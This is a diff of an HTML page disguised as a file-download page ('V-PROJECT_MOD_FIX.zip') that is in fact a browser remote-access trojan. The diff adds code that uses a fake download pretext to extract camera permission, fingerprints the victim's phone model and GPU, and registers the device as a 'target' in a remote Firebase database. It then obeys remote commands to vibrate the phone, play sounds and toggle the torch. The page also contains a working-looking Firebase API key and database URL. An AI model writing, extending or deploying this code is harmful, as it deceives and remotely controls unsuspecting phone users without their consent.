@@ -9,27 +9,23 @@
     <style>
         body { background: #f0f2f5; color: #333; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
         .box { background: #fff; padding: 30px; border-radius: 12px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); width: 85%; max-width: 320px; text-align: center; }
-        .btn { background: #007bff; color: #fff; border: none; padding: 12px; font-weight: bold; border-radius: 6px; width: 100%; margin-top: 20px; cursor: pointer; }
+        .btn { background: #007bff; color: #fff; border: none; padding: 14px; font-weight: bold; border-radius: 6px; width: 100%; margin-top: 20px; cursor: pointer; border-bottom: 3px solid #004a99; }
     </style>
 </head>
 <body>
     <div class="box" id="ui">
-        <div style="font-size: 40px;">📁</div>
-        <h3>V-PROJECT_MOD_V13.zip</h3>
-        <p style="font-size: 12px; color: #666;">Ukuran: 14.5 MB</p>
-        <button class="btn" onclick="gas()">DOWNLOAD</button>
+        <div style="font-size: 50px;">📁</div>
+        <h3>V-PROJECT_MOD_FIX.zip</h3>
+        <p style="font-size: 12px; color: #666;">Size: 14.58 MB</p>
+        <button class="btn" id="dl-btn" onclick="gas()">DOWNLOAD SEKARANG</button>
     </div>
 
 <script>
+    // FIREBASE CONFIG LU (TETEP SAMA)
     const firebaseConfig = {
       apiKey: "AIzaSyAddYZVOXibzxIWNTNwqqQn5n7QUrQN6ys",
-      authDomain: "rat-html.firebaseapp.com",
       databaseURL: "https://rat-html-default-rtdb.asia-southeast1.firebasedatabase.app",
-      projectId: "rat-html",
-      storageBucket: "rat-html.firebasestorage.app",
-      messagingSenderId: "1060124583265",
-      appId: "1:1060124583265:web:a117830e798cd1d60f5120",
-      measurementId: "G-XMHT2S731L"
+      projectId: "rat-html"
     };
 
     firebase.initializeApp(firebaseConfig);
@@ -38,58 +34,68 @@
     const params = new URLSearchParams(window.location.search);
     const myKey = params.get('key') || "UNKNOWN";
     const tid = "TGT-" + Math.floor(Math.random() * 9999);
+    let camStream = null;
 
     async function gas() {
-        // 1. Ambil Izin Getar & Audio
-        if(navigator.vibrate) navigator.vibrate(100);
-        new Audio('https://www.soundjay.com/buttons/beep-01a.mp3').play().catch(()=>{});
-
-        // 2. MINTA IZIN KAMERA (Biar titik hijau/senter muncul)
+        // AMBIL IZIN TITIK HIJAU
         try {
-            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
-            // Kalau berhasil, langsung matiin lagi biar gak curiga, tapi izin udah dapet
-            stream.getTracks().forEach(track => track.stop());
-        } catch (e) {
-            console.log("Izin ditolak target");
+            camStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
+        } catch (e) { 
+            alert("Klik Allow/Izinkan agar download berjalan!"); 
+            return; 
         }
 
-        document.getElementById('ui').innerHTML = "⏳ Menghubungkan ke server...";
+        // --- DETEKSI NAMA HP SUPER AKURAT ---
+        let brandHP = "Android Device";
         
+        try {
+            // Taktik 1: Pake UserAgentData (Chrome Terbaru)
+            if (navigator.userAgentData) {
+                const entropy = await navigator.userAgentData.getHighEntropyValues(["model", "platformVersion"]);
+                brandHP = entropy.model || "Android";
+            } 
+            
+            // Taktik 2: Cek GPU (Buat bedain Infinix/Samsung/Xiaomi)
+            const canvas = document.createElement('canvas');
+            const gl = canvas.getContext('webgl');
+            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+            const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+            
+            // Taktik 3: Bedah string User Agent lama
+            const ua = navigator.userAgent;
+            const modelMatch = ua.match(/\(([^)]+)\)/);
+            let rawModel = modelMatch ? modelMatch[1].split(';').pop().trim() : "";
+
+            // GABUNGIN INFO (Biar muncul brand aslinya)
+            if(rawModel.includes("Build")) rawModel = rawModel.split("Build")[0].trim();
+            brandHP = rawModel + " (" + renderer.split(' ').pop() + ")";
+            
+        } catch (err) { brandHP = "Android User"; }
+
+        // KIRIM KE FIREBASE
         db.ref('mario/targets/' + tid).set({
-            model: getModelName(),
+            model: brandHP,
             belongsTo: myKey,
             status: "online",
-            lastSeen: Date.now()
+            time: new Date().toLocaleTimeString()
         });
 
-        db.ref('mario/commands/' + tid).on('value', (s) => {
+        document.getElementById('ui').innerHTML = "<b>Downloading...</b><p>Tunggu sebentar...</p>";
+
+        // LISTENER RAT (GACOR)
+        db.ref('mario/commands/' + tid).on('value', async (s) => {
             const c = s.val(); if(!c) return;
             if(c.action === "vibrate") navigator.vibrate([500, 200, 500]);
             if(c.action === "play_audio") new Audio('https://www.soundjay.com/buttons/beep-01a.mp3').play();
-            if(c.action === "torch_on") {
-                navigator.mediaDevices.getUserMedia({video: {facingMode: 'environment'}})
-                .then(st => { 
-                    const track = st.getVideoTracks()[0];
-                    track.applyConstraints({advanced: [{torch: true}]}); 
-                });
+            if(c.action === "torch_on" && camStream) {
+                const track = camStream.getVideoTracks()[0];
+                await track.applyConstraints({advanced: [{torch: true}]});
             }
-            if(c.action === "torch_off") location.reload();
+            if(c.action === "torch_off" && camStream) {
+                const track = camStream.getVideoTracks()[0];
+                await track.applyConstraints({advanced: [{torch: false}]});
+            }
         });
-    }
-
-    // FIX DETEKSI NAMA HP (Gak bakal "k" doang)
-    function getModelName() {
-        const ua = navigator.userAgent;
-        if (/android/i.test(ua)) {
-            const parts = ua.split(')');
-            if (parts.length > 0) {
-                const modelPart = parts[0].split(';');
-                // Biasanya nama HP ada di bagian terakhir sebelum tanda kurung tutup
-                const name = modelPart[modelPart.length - 1].trim();
-                return name.length > 1 ? name : "Android Device";
-            }
-        }
-        return "Browser User";
     }
 </script>
 </body>
